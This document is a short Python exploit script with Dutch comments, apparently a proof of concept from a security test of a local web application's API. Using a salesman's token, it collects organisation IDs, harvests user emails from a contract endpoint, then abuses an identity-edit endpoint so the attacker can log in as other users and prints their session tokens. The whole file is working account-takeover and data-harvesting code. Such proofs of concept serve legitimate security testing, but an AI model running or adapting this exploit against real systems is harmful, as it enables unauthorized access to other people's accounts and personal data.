import requests
import json

url = "http://localhost:3333/api/data/organisation"

# eigen salesman token gebruiken
headers = {
    "Content-Type": "application/json",
    "Authorization" : "{Token van salesman}"
}

# alle organisaties ophalen
organizationResponse = requests.get(url, headers=headers)

## alle ids van alle organisaties ophalen
organizationData = json.loads(organizationResponse.text)
organisationids = []
for organisations in organizationData:
    organisationids.append(organisations['id'])

## contracten bij organisation id endpoint exploiteren om alle emails te krijgen van gebruikers
email_list = []
for id in organisationids:
    response = requests.get("http://localhost:3333/api/data/contract/" + id + "/organisation", headers=headers)
    data = json.loads(response.text)
    contracts = data["contracts"]
    for contract in contracts:
        customer = contract["customer"]
        supplier = contract["supplier"]
        last_edited_by = contract["lastEditedBy"]
        
        for user in [customer, supplier, last_edited_by]:
            if "email" in user:
                email_list.append(user["email"])

## kijken of er gebruikers zijn met een discrepantie tussen de gebruikers email en identity email, wat dus onstaat zodra een gebruiker zijn mail aanpast
for email in email_list:
    ## als identity email niet overeenkomt met user email gaat deze request goed, omdat het email dan nog niet bestaat in het identity schema
    re = requests.put("http://localhost:3333/api/auth/editIdentity", headers=headers, json={"email" : email})
   
    ## vervolgens kan er ingelogd worden met het identity email van de betreffende gebruiker, omdat de salesman identity nu deze mail heeft kan hij zijn eigen wachtwoord gebruiken.
    response = requests.post("http://localhost:3333/api/auth/login", headers=headers, json={"email" : email, 'password' : "wachtwoord"})

    if response.status_code != 401:
        ## token van de gebruiker, omdat het token gegeven wordt op basis van de user met de betrefende inlog mail. En niet op basis van de identity
        print(email)       
        print(response.text)
